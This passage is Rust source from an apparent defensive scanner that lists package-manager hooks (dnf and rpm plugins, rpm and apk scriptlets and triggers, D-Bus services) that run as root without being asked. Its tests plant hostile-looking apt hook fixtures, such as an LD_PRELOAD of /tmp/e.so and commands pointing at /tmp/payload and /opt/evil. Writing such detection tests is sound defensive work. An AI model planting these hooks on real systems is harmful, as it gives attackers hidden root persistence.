    if pythons.is_none() && !cx.root.exists("usr/bin/dnf") && !cx.root.exists("usr/bin/dnf-3") {
        return;
    }
    let pythons = pythons.unwrap_or_else(|| python_dirs(cx));
    // dnf5 is not python and loads none of these; dnf's own module says
    // there is a python dnf here to import them.
    if !pythons.iter().any(|p| cx.root.exists(p.join("site-packages/dnf/plugin.py"))) {
        return;
    }
    let off = cx.read("etc/dnf/dnf.conf").and_then(|b| ini_lookup(&b, "main", "plugins")).and_then(|v| as_bool(&v)) == Some(false);
    let claimed: BTreeSet<PathBuf> = out.iter().filter_map(|e| e.target_path.clone()).collect();
    for python in &pythons {
        let dir = python.join("site-packages/dnf-plugins");
        for ent in cx.dir(&dir) {
            if ent.is_dir || !ent.name.as_bytes().ends_with(b".py") {
                continue;
            }
            let rel = dir.join(&ent.name);
            if claimed.contains(&cx.root.abs(&rel)) {
                continue;
            }
            let plugin = lossy(&ent.name.as_bytes()[..ent.name.as_bytes().len() - 3]);
            let mut e = cx.entry(Kind::PkgHook, &rel, format!("dnf-plugin:{plugin}"));
            name_from_os(&mut e, &ent.name);
            e.trigger = Trigger::PackageOp;
            e.principal = Some("root".to_string());
            e.note("manager", "dnf");
            e.note("plugin", plugin);
            e.note("runs_when", "imported by every dnf run, whether or not a plugin conf enables it");
            e.target_path = Some(cx.root.abs(&rel));
            e.enabled = if off { Enablement::Disabled } else { Enablement::Enabled };
            if off {
                e.note("enablement", "plugins=0 in etc/dnf/dnf.conf disables every plugin");
            }
            out.push(e);
        }
    }
}

/// The python installations a plugin's module could live under. One directory
/// read, no traversal: the interpreter's whole site-packages tree is none of
/// this collector's business.
fn python_dirs(cx: &mut Ctx) -> Vec<PathBuf> {
    let mut out = Vec::new();
    for lib in distinct_dirs(cx, &["usr/lib", "usr/lib64", "lib", "lib64"]) {
        for ent in cx.dir(lib) {
            if ent.name.as_bytes().starts_with(b"python3") {
                out.push(Path::new(lib).join(&ent.name));
            }
        }
    }
    out
}

fn plugin_code(cx: &Ctx, pythons: &[PathBuf], manager: &str, plugin: &str) -> Option<PathBuf> {
    let mut candidates: Vec<PathBuf> = Vec::new();
    match manager {
        "dnf5" => {
            for lib in ["usr/lib64", "usr/lib"] {
                candidates.push(PathBuf::from(format!("{lib}/dnf5/plugins/{plugin}.so")));
            }
        }
        "libdnf5" => {
            for lib in ["usr/lib64", "usr/lib"] {
                candidates.push(PathBuf::from(format!("{lib}/libdnf5/plugins/{plugin}.so")));
            }
        }
        "yum" => {
            for lib in ["usr/share", "usr/lib"] {
                candidates.push(PathBuf::from(format!("{lib}/yum-plugins/{plugin}.py")));
            }
        }
        _ => {}
    }
    candidates.extend(
        pythons.iter().map(|p| p.join("site-packages/dnf-plugins").join(format!("{plugin}.py"))),
    );
    candidates.into_iter().find(|c| cx.root.stat(c).is_ok())
}

// ------------------------------------------------------------------- rpm ----

/// What an rpm transaction plugin is: a shared object rpm dlopen()s for every
/// transaction, wired up by a `%__transaction_<name>` macro. Defining the
/// macro empty is how rpm turns one off.
fn rpm(cx: &mut Ctx) -> Vec<Entry> {
    let (mut out, caveat) = rpm_scriptlets(cx);
    let mut files: Vec<PathBuf> = Vec::new();
    for dir in distinct_dirs(cx, &["usr/lib/rpm", "lib/rpm"]) {
        files.push(Path::new(dir).join("macros"));
        for ent in cx.dir(Path::new(dir).join("macros.d")) {
            if !ent.is_dir {
                files.push(Path::new(dir).join("macros.d").join(&ent.name));
            }
        }
    }
    for ent in cx.dir("etc/rpm") {
        if !ent.is_dir && ent.name.as_bytes().starts_with(b"macros") {
            files.push(Path::new("etc/rpm").join(&ent.name));
        }
    }

    let mut referenced: BTreeSet<String> = BTreeSet::new();
    for rel in files {
        let Some(bytes) = cx.read(&rel) else { continue };
        for line in macro_lines(&bytes) {
            let Some(rest) = line.strip_prefix(b"%") else { continue };
            let split = rest
                .iter()
                .position(|b| b.is_ascii_whitespace() || *b == b'(')
                .unwrap_or(rest.len());
            let (macro_name, body) = rest.split_at(split);
            if !macro_name.starts_with(b"__transaction_") {
                continue;
            }
            let body = body.trim_ascii();
            if let Some(so) = shared_object_name(body) {
                referenced.insert(so);
            }

            let macro_name = lossy(macro_name);
            let mut e = cx.entry(Kind::PkgHook, &rel, macro_name.clone());
            e.trigger = Trigger::PackageOp;
            e.principal = Some("root".to_string());
            e.note("manager", "rpm");
            e.note("macro", format!("%{macro_name}"));

            // Not every `%__transaction_*` macro wires up a plugin. The
            // unshare plugin's own settings — `%__transaction_unshare_paths
            // /tmp:/home` — share the prefix and load nothing, so they are
            // reported as the settings they are rather than as code that runs.
            let off = body.is_empty() || body == b"%{nil}" || body == b"%nil";
            if off || names_shared_object(body) {
                e.note("role", "plugin");
                // rpm turns a transaction plugin off by defining its macro
                // empty, which is why an empty body is not a missing value.
                e.enabled = if off { Enablement::Disabled } else { Enablement::Enabled };
                set_command(&mut e, body);
                // `%{__plugindir}/audit.so` resolves only through rpm's own
                // macro table, which is not expanded here. The object's name
                // is the join to the entry made from the plugin directory.
                if let Some(so) = shared_object_name(body) {
                    e.note("plugin", so);
                }
            } else {
                e.note("role", "plugin setting");
                e.note("value", lossy(body));
                e.enabled = Enablement::NotApplicable;
            }
            e.note("caveat", caveat);
            out.push(e);
        }
    }

    for dir in distinct_dirs(cx, &["usr/lib/rpm/plugins", "lib/rpm/plugins", "usr/lib/rpm", "lib/rpm"])
    {
        for ent in cx.dir(dir) {
            if ent.is_dir || !ent.name.as_bytes().ends_with(b".so") {
                continue;
            }
            let rel = Path::new(dir).join(&ent.name);
            let file = lossy(ent.name.as_bytes());
            let mut e = cx.entry(Kind::PkgHook, &rel, format!("plugin:{file}"));
            name_from_os(&mut e, &ent.name);
            e.trigger = Trigger::PackageOp;
            e.principal = Some("root".to_string());
            e.target_path = Some(cx.root.abs(&rel));
            e.note("manager", "rpm");
            e.note("plugin", file.clone());
            if referenced.contains(&file) {
                e.enabled = Enablement::Enabled;
                e.note("wired_by", "a %__transaction_* macro names this object");
            } else {
                // rpm's default macro set may name it in a file this collector
                // did not read, so absence of a reference is not proof.
                e.enabled = Enablement::Unknown;
                e.flag(Flag::DegradedEnablement);
                e.note("wired_by", "no %__transaction_* macro read here names this object");
            }
            e.note("caveat", caveat);
            out.push(e);
        }
    }
    out
}

/// Stated on every rpm configuration entry rather than in a README, because
/// the operator reading the JSON is the one who needs to know the limit of
/// what they are looking at.
const RPM_CAVEAT: &str = "configuration shows transaction plugins only; the \
     scriptlets and file triggers rpm keeps in its package headers are read \
     from the rpmdb and reported as their own entries";

/// The same limit where no database was readable, in which case the scriptlet
/// half of the answer is genuinely missing rather than elsewhere.
const RPM_NO_DB: &str = "configuration shows transaction plugins only; no rpmdb \
     could be read on this root, so the %pre/%post scriptlets and \
     %filetrigger/%transfiletrigger scripts it holds are not reported";

/// The scriptlets and triggers rpm keeps in its package headers. A `%post`
/// runs as root on every transaction of its own package, a
/// `%transfiletriggerin -- /usr/bin` runs as root whenever *anything* is
/// installed into /usr/bin, and no file under /etc or /usr/lib/rpm names
/// either of them.
///
/// Every one found is emitted. Which of them is interesting is a judgement
/// this tool does not make (§8), and the volume is bounded by how few
/// packages carry a scriptlet at all — roughly one entry per three installed
/// packages: 47 on a stock Fedora 44 container of 147 packages, 141 on one of
/// 475 with the development tools.
fn rpm_scriptlets(cx: &mut Ctx) -> (Vec<Entry>, &'static str) {
    let Some((db, scriptlets)) = crate::provenance::rpm::scriptlets(cx.root) else {
        return (Vec::new(), RPM_NO_DB);
    };

    // Position in the header identifies nothing: a package holds several
    // triggers of one type, and one added above the others must not
    // re-identify them. What identifies a trigger is what fires it, so that is
    // what the name is built from — never the body, which must be free to
    // change without the entry becoming a different entry.
    let base_name = |s: &crate::provenance::rpm::Scriptlet| {
        let pkg = match s.arch.is_empty() {
            true => s.package.clone(),
            false => format!("{}.{}", s.package, s.arch),
        };
        match s.fires_on.is_empty() {
            true => format!("{pkg}:{}", s.kind),
            false => {
                let fires = format!("{}\n{:?}", s.fires_on.join("\n"), s.priority);
                format!("{pkg}:{}:{}", s.kind, short_hash(fires.as_bytes()))
            }
        }
    };
    // Several kernels are installed side by side under one package name. A
    // counter on the repeats would move whenever one is added or removed and
    // read as every other's scriptlet changing; the version does not move.
    let mut installed: BTreeMap<String, usize> = BTreeMap::new();
    for s in &scriptlets {
        *installed.entry(base_name(s)).or_default() += 1;
    }

    let mut out = Vec::new();
    for s in scriptlets {
        let mut name = base_name(&s);
        if installed[&name] > 1 {
            name = format!("{name}@{}", s.version);
        }

        let mut e = cx.entry(Kind::PkgHook, db, name);
        e.trigger = Trigger::PackageOp;
        e.principal = Some("root".to_string());
        e.enabled = Enablement::Enabled;
        e.note("manager", "rpm");
        e.note("package", s.package.clone());
        e.note("version", s.version.clone());
        e.note("scriptlet", s.kind.clone());
        if !s.prog.is_empty() {
            e.note("interpreter", s.prog.clone());
        }
        // The source is a database file, and an operator who sees one has to
        // know the entry is a field inside it rather than the file itself.
        e.note("read_from", "rpm package header");
        if !s.fires_on.is_empty() {
            e.note("fires_on", s.fires_on.join(", "));
        }
        if let Some(p) = s.priority {
            e.note("priority", p.to_string());
        }
        if s.truncated {
            e.note("body_truncated", "the scriptlet is longer than the read cap");
        }
        set_command(&mut e, &s.body);
        // A scriptlet is a program, not a command line: the first absolute
        // path in the body is as likely to be an argument or a comment as the
        // thing that runs. What rpm execs is the interpreter.
        e.target_path = first_absolute(s.prog.as_bytes());
        // `<lua>` names no file: rpm runs the body in an interpreter built
        // into itself. Saying so is what keeps every lua scriptlet on the
        // host from being reported as a command whose program went missing.
        if s.prog == "<lua>" || s.prog.is_empty() {
            e.note("target_unverifiable", "rpm runs this itself; no program is named");
        }
        if is_shell(s.prog.as_bytes()) {
            e.note("script_shell", "true");
        }
        out.push(e);
    }
    (out, RPM_CAVEAT)
}

// ------------------------------------------------------------------ apk ----

/// Whether an interpreter line (a path and its options) names a POSIX-style
/// shell: what a body has to be for its text to be read as shell.
fn is_shell(line: &[u8]) -> bool {
    let program = line.trim_ascii_start().split(|b| b.is_ascii_whitespace()).next().unwrap_or_default();
    let name = program.rsplit(|b| *b == b'/').next().unwrap_or_default();
    [&b"sh"[..], b"bash", b"dash", b"ash", b"zsh"].contains(&name)
}

/// The scripts apk keeps for every installed package, and its triggers. A
/// package's pre- and post-install, -upgrade and -deinstall scripts run as
/// root on its own transactions; its trigger script runs, as root, at the
/// end of any transaction that touched a directory the triggers file lists
/// for it — busybox's re-links its applets whenever /usr/bin changes. All
/// of it lives in apk's own state under /lib/apk/db rather than in any
/// file a package ships, so the source is the archive and the entry says
/// so.
fn apk_hooks(cx: &mut Ctx) -> Vec<Entry> {
    let mut out = Vec::new();
    let Some((archive, scripts)) = crate::provenance::apk::scripts(cx.root) else { return out };
    let triggers = crate::provenance::apk::triggers(cx.root);
    let (triggers_file, triggers) = match &triggers {
        Some((f, t)) => (Some(*f), t.as_slice()),
        None => (None, &[][..]),
    };
    let mut with_script: BTreeSet<String> = BTreeSet::new();
    for s in &scripts {
        let mut e = cx.entry(Kind::PkgHook, archive, format!("{}:{}", s.package, s.phase));
        e.trigger = Trigger::PackageOp;
        e.principal = Some("root".to_string());
        e.enabled = Enablement::Enabled;
        e.note("manager", "apk");
        e.note("package", s.package.clone());
        e.note("version", s.version.clone());
        e.note("script", s.phase.clone());
        e.note("read_from", "apk scripts archive");
        if s.phase == "trigger" {
            with_script.insert(s.digest.clone());
            let dirs: Vec<&str> = triggers.iter().filter(|t| t.digest == s.digest).flat_map(|t| t.dirs.iter().map(String::as_str)).collect();
            if dirs.is_empty() {
                e.note("fires_on", "nothing: the triggers file lists no directory for it");
            } else {
                e.note("fires_on", dirs.join(", "));
            }
        }
        set_command(&mut e, &s.body);
        // apk runs the script as a file of its own, so the interpreter is the
        // shebang's. No file on disk is that program; where the shebang names
        // a shell, the body is shell text and the enrichment pass reads the
        // programs it starts out of it.
        e.note("target_unverifiable", "apk runs the script from its archive; no file on disk is the program");
        if s.body.strip_prefix(b"#!").is_some_and(|line| is_shell(line.split(|b| *b == b'\n').next().unwrap_or_default())) {
            e.note("script_shell", "true");
        }
        out.push(e);
    }
    // A trigger registered for a package whose script is not in the archive
    // fires nothing apk can run, and is still a registration worth a row.
    if let Some(file) = triggers_file {
        for t in triggers.iter().filter(|t| !with_script.contains(&t.digest)) {
            let who = t.package.as_ref().map(|(n, _)| n.clone()).unwrap_or_else(|| format!("checksum {}", &t.digest[..12.min(t.digest.len())]));
            let mut e = cx.entry(Kind::PkgHook, file, format!("{who}:trigger"));
            e.trigger = Trigger::PackageOp;
            e.principal = Some("root".to_string());
            e.enabled = Enablement::Disabled;
            e.note("manager", "apk");
            if let Some((n, v)) = &t.package {
                e.note("package", n.clone());
                e.note("version", v.clone());
            }
            e.note("script", "trigger");
            e.note("read_from", "apk triggers file");
            e.note("fires_on", t.dirs.join(", "));
            e.note("not_run", "no trigger script for it in the scripts archive");
            e.note("target_unverifiable", "a registration in apk's triggers file, not a file");
            out.push(e);
        }
    }
    out
}

/// Does this macro body name something rpm could dlopen? The extension is the
/// only signal available before the transaction runs: rpm finds its plugins by
/// looking for shared objects, and the macro says which one and with what.
fn names_shared_object(body: &[u8]) -> bool {
    shared_object_name(body).is_some()
}

fn shared_object_name(body: &[u8]) -> Option<String> {
    body.split(|b: &u8| b.is_ascii_whitespace())
        .find(|w| w.ends_with(b".so"))
        .and_then(|w| w.rsplit(|b| *b == b'/').next())
        .map(lossy)
}

/// rpm macro definitions, joined on a trailing backslash, comments dropped.
fn macro_lines(bytes: &[u8]) -> Vec<Vec<u8>> {
    let mut out = Vec::new();
    let mut current: Vec<u8> = Vec::new();
    let mut continued = false;
    for raw in bytes.split(|b| *b == b'\n') {
        let line = raw.strip_suffix(b"\r").unwrap_or(raw);
        let more = line.last() == Some(&b'\\');
        let body = if more { &line[..line.len() - 1] } else { line };
        if !continued && (body.trim_ascii_start().is_empty() || body.trim_ascii_start()[0] == b'#')
        {
            continued = more;
            continue;
        }
        if continued {
            current.push(b' ');
        }
        current.extend_from_slice(body.trim_ascii());
        continued = more;
        if !continued && !current.is_empty() {
            out.push(std::mem::take(&mut current));
        }
    }
    if !current.is_empty() {
        out.push(current);
    }
    out
}

// ------------------------------------------------------------------ D-Bus ----

const SYSTEM_SERVICE_DIRS: &[&str] = &[
    "usr/share/dbus-1/system-services",
    "usr/local/share/dbus-1/system-services",
    "usr/lib/dbus-1/system-services",
    "lib/dbus-1/system-services",
    "run/dbus-1/system-services",
    "etc/dbus-1/system-services",
];

const SESSION_SERVICE_DIRS: &[&str] = &[
    "usr/share/dbus-1/services",
    "usr/local/share/dbus-1/services",
    "usr/lib/dbus-1/services",
    "lib/dbus-1/services",
    "run/dbus-1/services",
    "etc/dbus-1/services",
];

/// Access policy, not activation. Nothing here executes, so nothing here gets
/// an entry; what it is good for is telling the operator who may reach the
/// service that does execute.
const POLICY_DIRS: &[&str] = &[
    "etc/dbus-1/system.d",
    "usr/share/dbus-1/system.d",
    "usr/local/share/dbus-1/system.d",
    "usr/lib/dbus-1/system.d",
    "lib/dbus-1/system.d",
    "run/dbus-1/system.d",
    "etc/dbus-1/session.d",
    "usr/share/dbus-1/session.d",
    "usr/local/share/dbus-1/session.d",
    "usr/lib/dbus-1/session.d",
    "lib/dbus-1/session.d",
];

fn dbus(cx: &mut Ctx) -> Vec<Entry> {
    let policies = dbus_policies(cx);
    let mut out = Vec::new();

    for dir in distinct_dirs(cx, SYSTEM_SERVICE_DIRS) {
        out.extend(service_dir(cx, Path::new(dir).to_path_buf(), "system", None, &policies));
    }
    for dir in distinct_dirs(cx, SESSION_SERVICE_DIRS) {
        out.extend(service_dir(cx, Path::new(dir).to_path_buf(), "session", None, &policies));
    }

    // A user's own session services are the interesting half: the directory is
    // writable without root, and anything on the session bus can activate what
    // is in it.
    let users = cx.users;
    let mut seen: BTreeSet<PathBuf> = BTreeSet::new();
    for u in users {
        let dir = u.in_home(".local/share/dbus-1/services");
        if !seen.insert(dir.clone()) {
            continue;
        }
        out.extend(service_dir(cx, dir, "session", Some(u.name.as_str()), &policies));
    }
    out
}

fn service_dir(
    cx: &mut Ctx,
    dir: PathBuf,
    bus: &str,
    principal: Option<&str>,
    policies: &BTreeMap<String, Vec<String>>,
) -> Vec<Entry> {
    let mut out = Vec::new();
    for ent in cx.dir(&dir) {
        if ent.is_dir || !ent.name.as_bytes().ends_with(b".service") {
            continue;
        }
        let rel = dir.join(&ent.name);
        let Some(bytes) = cx.read(&rel) else { continue };
        out.push(service_file(cx, &rel, &ent.name, &bytes, bus, principal, policies));
    }
    out
}

fn service_file(
    cx: &mut Ctx,
    rel: &Path,
    file: &OsStr,
    bytes: &[u8],
    bus: &str,
    principal: Option<&str>,
    policies: &BTreeMap<String, Vec<String>>,
) -> Entry {
    // The file name, not the Name= key, is the identity: a bus name edited in
    // place must diff as a changed entry, not as one removed and one added.
    let mut e = cx.entry(Kind::DbusService, rel, lossy(file.as_bytes()));
    name_from_os(&mut e, file);
    // Activation is on demand and unscheduled: any caller that asks the bus
    // for the name starts it, at any moment.
    e.trigger = Trigger::Always;
    e.principal = principal.map(str::to_string);
    e.note("bus", bus);

    let pairs = service_group(bytes);
    if pairs.is_empty() {
        e.note("parse", "no [D-BUS Service] group, or it is empty");
    }

    let mut exec: Option<Vec<u8>> = None;
    let mut bus_name: Option<String> = None;
    let mut systemd = false;
    for (key, value) in pairs {
        match key.as_str() {
            "Exec" => exec = Some(value),
            "Name" => {
                bus_name = Some(lossy(&value));
                e.note("bus_name", lossy(&value));
            }
            // The bus activates as this user, whatever started the caller.
            "User" => e.principal = Some(lossy(&value)),
            "SystemdService" => {
                systemd = true;
                // Recorded so an operator can join this entry to the systemd
                // collector's entry for the same unit: with this key present,
                // the bus hands activation to systemd and the unit runs even
                // though nothing enabled it.
                e.note("systemd_service", lossy(&value));
            }
            _ => e.note(&format!("dbus.{key}"), lossy(&value)),
        }
    }

    match &exec {
        Some(cmd) => set_command(&mut e, cmd),
        None => {
            e.note("exec", "no Exec= key");
        }
    }
    e.enabled = if exec.is_some() || systemd {
        Enablement::Enabled
    } else {
        Enablement::NotApplicable
    };

    let stem = lossy(file.as_bytes().strip_suffix(b".service").unwrap_or(file.as_bytes()));
    let mut matched: Vec<String> = Vec::new();
    for key in [bus_name.as_deref(), Some(stem.as_str())].into_iter().flatten() {
        if let Some(files) = policies.get(key) {
            matched.extend(files.iter().cloned());
        }
    }
    matched.sort();
    matched.dedup();
    if !matched.is_empty() {
        e.note("policy_files", matched.join(", "));
    }
    e
}

/// The `[D-BUS Service]` group of a freedesktop key file.
fn service_group(bytes: &[u8]) -> Vec<(String, Vec<u8>)> {
    let mut out = Vec::new();
    let mut inside = false;
    for line in bytes.split(|b| *b == b'\n') {
        let line = line.trim_ascii();
        if line.is_empty() || line[0] == b'#' {
            continue;
        }
        if line[0] == b'[' {
            let group = line.strip_prefix(b"[").and_then(|l| l.strip_suffix(b"]")).unwrap_or(line);
            inside = lossy(group).eq_ignore_ascii_case("D-BUS Service");
            continue;
        }
        if !inside {
            continue;
        }
        let Some(eq) = line.iter().position(|b| *b == b'=') else { continue };
        let key = lossy(line[..eq].trim_ascii());
        if key.is_empty() {
            continue;
        }
        out.push((key, line[eq + 1..].trim_ascii().to_vec()));
    }
    out
}

/// Bus name to the policy files that mention it. Read as bytes and scanned for
/// the two attributes that name a service, rather than parsed as XML: the
/// answer wanted is "which file governs this name", and a policy file that no
/// XML parser would accept still tells us that.
fn dbus_policies(cx: &mut Ctx) -> BTreeMap<String, Vec<String>> {
    let mut out: BTreeMap<String, Vec<String>> = BTreeMap::new();
    for dir in distinct_dirs(cx, POLICY_DIRS) {
        for ent in cx.dir(dir) {
            if ent.is_dir {
                continue;
            }
            let rel = Path::new(dir).join(&ent.name);
            let Some(bytes) = cx.read_capped(&rel, POLICY_CAP) else { continue };
            let abs = cx.root.abs(&rel).display().to_string();

            let mut names = xml_attrs(&bytes, &[b"own=", b"own_prefix=", b"send_destination="]);
            // A policy file is conventionally named after the service it
            // governs, which covers the ones that only grant send_interface.
            let stem = ent.name.as_bytes();
            names.insert(lossy(stem.strip_suffix(b".conf").unwrap_or(stem)));
            for n in names {
                if n.is_empty() || n == "*" {
                    continue;
                }
                out.entry(n).or_default().push(abs.clone());
            }
        }
    }
    out
}

/// The quoted values of the named XML attributes. Single and double quotes
/// both count; an attribute whose quote is never closed yields nothing rather
/// than running off the end.
fn xml_attrs(bytes: &[u8], needles: &[&[u8]]) -> BTreeSet<String> {
    let mut out = BTreeSet::new();
    for needle in needles {
        let mut i = 0;
        while i + needle.len() <= bytes.len() {
            if !bytes[i..].starts_with(needle) {
                i += 1;
                continue;
            }
            i += needle.len();
            let Some(&quote) = bytes.get(i) else { break };
            if quote != b'"' && quote != b'\'' {
                continue;
            }
            i += 1;
            let start = i;
            while i < bytes.len() && bytes[i] != quote {
                i += 1;
            }
            if i < bytes.len() {
                out.insert(lossy(&bytes[start..i]));
                i += 1;
            }
        }
    }
    out
}

// ---------------------------------------------------------------- shared ----

/// Merged /usr makes `lib/x` and `usr/lib/x` one directory. Walking both emits
/// every vendor file twice under two ids that never reconcile in a diff (§5),
/// so each inode is walked once under the first name that reached it.
fn distinct_dirs(cx: &mut Ctx, candidates: &[&'static str]) -> Vec<&'static str> {
    let listed = candidates.iter().enumerate().map(|(rank, dir)| (rank, PathBuf::from(dir))).collect();
    cx.distinct_dirs(listed).into_iter().map(|(rank, _, _)| candidates[rank]).collect()
}

/// Fills in everything derived from a command line at once, so no caller can
/// set the command and forget the encoding flag or the environment notes.
fn set_command(e: &mut Entry, bytes: &[u8]) {
    e.command = Some(bytes.to_vec());
    e.target_path = first_absolute(bytes);
    if std::str::from_utf8(bytes).is_err() {
        e.flag(Flag::EncodingAnomaly);
        e.note("command_hex", hex(bytes));
    }
}


fn ini_lookup(bytes: &[u8], section: &str, key: &str) -> Option<String> {
    let mut current = String::new();
    let mut fallback = None;
    for line in bytes.split(|b| *b == b'\n') {
        let line = line.trim_ascii();
        if line.is_empty() || line[0] == b'#' || line[0] == b';' {
            continue;
        }
        if line[0] == b'[' {
            let g = line.strip_prefix(b"[").and_then(|l| l.strip_suffix(b"]")).unwrap_or(line);
            current = lossy(g);
            continue;
        }
        let Some(eq) = line.iter().position(|b| *b == b'=') else { continue };
        if !lossy(line[..eq].trim_ascii()).eq_ignore_ascii_case(key) {
            continue;
        }
        let value = lossy(line[eq + 1..].trim_ascii());
        if current.eq_ignore_ascii_case(section) {
            return Some(value);
        }
        fallback.get_or_insert(value);
    }
    fallback
}

fn as_bool(v: &str) -> Option<bool> {
    match v.trim().to_ascii_lowercase().as_str() {
        "1" | "true" | "yes" | "on" | "enabled" => Some(true),
        "0" | "false" | "no" | "off" | "disabled" => Some(false),
        _ => None,
    }
}




#[cfg(test)]
mod tests {
    use super::*;
    use crate::root::Root;
    use crate::scan::{Options, Scan, Status, run};
    use std::fs;

    fn tree(tag: &str) -> PathBuf {
        let p = std::env::temp_dir().join(format!("unbidden-pkg-{tag}-{}", std::process::id()));
        let _ = fs::remove_dir_all(&p);
        fs::create_dir_all(&p).unwrap();
        p
    }

    fn put(root: &Path, rel: &str, bytes: &[u8]) {
        let p = root.join(rel);
        fs::create_dir_all(p.parent().unwrap()).unwrap();
        fs::write(p, bytes).unwrap();
    }

    /// A file of `len` bytes whose tail is a hole. The oversized-input tests
    /// need a genuinely oversized file, not a full temp filesystem.
    fn sparse(root: &Path, rel: &str, head: &[u8], len: u64) {
        use std::io::Write;
        let p = root.join(rel);
        fs::create_dir_all(p.parent().unwrap()).unwrap();
        let mut f = fs::File::create(&p).unwrap();
        f.write_all(head).unwrap();
        f.set_len(len).unwrap();
    }

    fn scan(root: &Path) -> Scan {
        let root = Root::at(root).unwrap();
        let collectors: Vec<Box<dyn Collector>> = vec![Box::new(PkgHooks)];
        run(&root, &Options { deep: false }, &collectors)
    }

    /// As `scan`, then enrichment, which is where the environment a command
    /// hands its program is read.
    fn scan_enriched(dir: &Path) -> Scan {
        let root = Root::at(dir).unwrap();
        let mut s = scan(dir);
        crate::enrich::enrich(&root, &mut s);
        s
    }

    fn of_kind(s: &Scan, kind: Kind) -> Vec<&Entry> {
        s.entries.iter().filter(|e| e.kind == kind).collect()
    }

    fn one<'a>(s: &'a Scan, want: impl Fn(&Entry) -> bool) -> &'a Entry {
        let found: Vec<&Entry> = s.entries.iter().filter(|e| want(e)).collect();
        assert_eq!(found.len(), 1, "expected exactly one match, got {}", found.len());
        found[0]
    }

    fn status(s: &Scan) -> &Status {
        &s.header.collectors.iter().find(|c| c.name == "pkg").unwrap().status
    }

    /// Everything about an entry that must not depend on how the hook was
    /// spelled. mtime is excluded: rewriting the file moves it.
    fn shape(e: &Entry) -> (String, String, Option<Vec<u8>>, Option<PathBuf>, Enablement, BTreeMap<String, String>) {
        (e.id.clone(), e.name.clone(), e.command.clone(), e.target_path.clone(), e.enabled, e.raw.clone())
    }

    #[test]
    fn both_apt_conf_spellings_produce_the_same_entry() {
        let dir = tree("spelling");
        let nested = br#"
            // a hook written as apt's nested blocks
            DPkg
            {
                Post-Invoke { "/usr/bin/touch /var/lib/x"; };
            };
        "#;
        put(&dir, "etc/apt/apt.conf.d/50hooks", nested);
        let s = scan(&dir);
        let first = shape(one(&s, |e| e.kind == Kind::PkgHook));

        // The same hook, flattened with `::`. apt reads them identically and
        // so must the collector: a diff must not report a rewrite as a
        // removal plus an addition.
        let flat = br#"DPkg::Post-Invoke {"/usr/bin/touch /var/lib/x";};"#;
        put(&dir, "etc/apt/apt.conf.d/50hooks", flat);
        let s = scan(&dir);
        let second = shape(one(&s, |e| e.kind == Kind::PkgHook));
        assert_eq!(first, second, "one hook, two spellings, two different entries");

        // And the third spelling: a bare assignment with no block at all.
        put(&dir, "etc/apt/apt.conf.d/50hooks", br#"DPkg::Post-Invoke "/usr/bin/touch /var/lib/x";"#);
        let s = scan(&dir);
        assert_eq!(shape(one(&s, |e| e.kind == Kind::PkgHook)), first);

        let e = one(&s, |e| e.kind == Kind::PkgHook);
        assert_eq!(e.trigger, Trigger::PackageOp);
        assert_eq!(e.principal.as_deref(), Some("root"));
        assert_eq!(e.enabled, Enablement::Enabled);
        assert_eq!(e.raw.get("key").map(String::as_str), Some("dpkg::post-invoke"));
        assert_eq!(e.target_path, Some(PathBuf::from("/usr/bin/touch")));
        fs::remove_dir_all(&dir).unwrap();
    }

    #[test]
    fn only_the_keys_that_execute_become_entries() {
        let dir = tree("keys");
        put(
            &dir,
            "etc/apt/apt.conf.d/20hooks",
            br#"
            APT::Update::Post-Invoke-Success {"/usr/bin/one";};
            Binary::apt-get::DPkg::Pre-Install-Pkgs {"/usr/bin/two --file"; };
            DPkg::Options {"--force-confdef";};
            APT::Get::Assume-Yes "true";
            DPkg::Pre-Invoke {"LD_PRELOAD=/tmp/e.so /usr/bin/three";};
            APT::Update::Post-Invoke {"/usr/bin/four"; "/usr/bin/five";};
            "#,
        );
        // A fragment apt will not read: still evidence, but it runs nothing.
        put(&dir, "etc/apt/apt.conf.d/99evil.sh", br#"DPkg::Post-Invoke {"/tmp/payload";};"#);
        // A dot-first name is skipped whatever follows it, `.conf` included.
        put(&dir, "etc/apt/apt.conf.d/.conf", br#"DPkg::Post-Invoke {"/tmp/dotfile";};"#);
        // Pin priorities execute nothing at all.
        put(&dir, "etc/apt/preferences.d/99pin", b"Package: *\nPin: release a=stable\nPin-Priority: 900\n");

        let s = scan_enriched(&dir);
        let hooks = of_kind(&s, Kind::PkgHook);
        assert_eq!(
            hooks.len(),
            7,
            "one entry per command string, and a two-command block is two: {:?}",
            hooks.iter().map(|e| &e.name).collect::<Vec<_>>()
        );
        assert!(
            !s.entries.iter().any(|e| e.source.to_string_lossy().contains("preferences.d")),
            "nothing in preferences.d executes"
        );

        let scoped = one(&s, |e| e.raw.get("key").is_some_and(|k| k == "dpkg::pre-install-pkgs"));
        assert_eq!(scoped.raw.get("front_end").map(String::as_str), Some("apt-get"));
        assert_eq!(scoped.command.as_deref(), Some(b"/usr/bin/two --file".as_slice()));

        let preload = one(&s, |e| e.raw.contains_key("env.LD_PRELOAD"));
        assert_eq!(preload.raw.get("env.LD_PRELOAD").map(String::as_str), Some("/tmp/e.so"));
        assert_eq!(
            preload.target_path,
            Some(dir.join("usr/bin/three")),
            "the target is the program, not the preload"
        );

        let dotfile = one(&s, |e| e.source.to_string_lossy().ends_with("/.conf"));
        assert_eq!(dotfile.enabled, Enablement::Disabled, "apt reads no dotfile");
        let ignored = one(&s, |e| e.source.to_string_lossy().ends_with("99evil.sh"));
        assert_eq!(ignored.enabled, Enablement::Disabled, "apt never reads a .sh fragment");
        assert!(ignored.raw.contains_key("not_read_by_apt"));
        fs::remove_dir_all(&dir).unwrap();
    }

    #[test]
    fn only_a_shells_interpreter_line_marks_a_body_as_shell_text() {
        for yes in ["/bin/sh", "/usr/bin/bash -e", "/bin/ash", " /bin/dash"] {
            assert!(is_shell(yes.as_bytes()), "{yes}");
        }
        for no in ["<lua>", "", "/usr/bin/python3", "/bin/sh-not", "/usr/bin/perl -w"] {
            assert!(!is_shell(no.as_bytes()), "{no}");
        }
    }

    #[test]
    fn the_keys_that_name_a_program_apt_runs_are_entries_too() {
        let dir = tree("programs");
        put(
            &dir,
            "etc/apt/apt.conf.d/30progs",
            br#"
            Dir::Bin::dpkg "/opt/evil/dpkg";
            Dir::Bin::methods "/opt/evil/methods";
            Acquire::http::Proxy-Auto-Detect "/opt/evil/proxy";
            Acquire::https { ProxyAutoDetect "/opt/evil/proxy2"; };
            Dir::Cache "/var/cache/apt";
            Acquire::http::Proxy "http://proxy:3128";
            "#,
        );
        let s = scan(&dir);
